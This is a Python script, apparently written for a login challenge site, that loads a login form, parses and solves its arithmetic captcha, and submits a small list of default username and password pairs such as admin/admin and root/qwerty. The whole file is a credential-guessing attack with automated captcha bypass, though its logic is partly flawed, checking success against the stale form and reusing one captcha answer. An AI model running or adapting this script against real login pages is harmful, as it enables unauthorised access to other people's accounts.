import mechanize
from bs4 import BeautifulSoup
import operator


# html_text = requests.get("https://afeladat2017.whiteshield.net/login").text 
br = mechanize.Browser()
br.set_handle_robots(False)
cookies = mechanize.CookieJar()
br.set_cookiejar(cookies)
br.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')]
br.set_handle_refresh(False)
br.open("https://afeladat2017.whiteshield.net/login")
br.select_form(nr=0)

res = br.submit()
html = res.read()
soup = BeautifulSoup(html,"lxml")
form = soup.find("form", action="/login")
#print(form.text)

succes_div = soup.find("div", class_="container")
succes_text = succes_div.find("article").find("h1").text

math= form.find("span", id="math").text
math_input = form.find("input", id="id_captcha_1")  
print("math",math)
Cap=[]
#login options
usernames=["admin","admin","root","john"]
passwords=["admin","admin","qwerty","password"]


first_math = int(math[0:1]) #(element) +
print(first_math)
second_math = int(math[2:-1]) # +(element ) without =
web_operators = math[1]
ops = {
"+": operator.add,
"-": operator.sub,
"*": operator.mul,
"/": operator.truediv
    }
operators = ops[web_operators](first_math,second_math)
str_operator = str(operators)
# User=[]
# Cap=[]
All=[]
User=[]
Pass=[]

#using defined elements and options  
for u_element in usernames:
    User.append(u_element)
    
        
    for p_element in passwords:
        Pass.append(p_element)
        All.append([u_element,p_element,first_math,web_operators,second_math,operators])
        print(All[-1])
        if "Success!" in form.text:
            print("Logged in")
            print(f"The password was:{Pass}")
        else:
            br.select_form(nr=0)
            br.form['username'] = User[-1] 
            br.form['password'] =  Pass[-1]
            br.form['captcha_1'] = str_operator
            print(br.form["username"])
            print(br.form["password"])
            print(br.form["captcha_1"])
            response=br.submit()
            print("Submit:",response.read())
            
        #     # #succes
        # if "Success!" in succes_div.text:
        #     print("Logged in")
        #     print(f"The password was:{Pass}")

        #      # #failure->again    
        # else:
        #     print("fail")



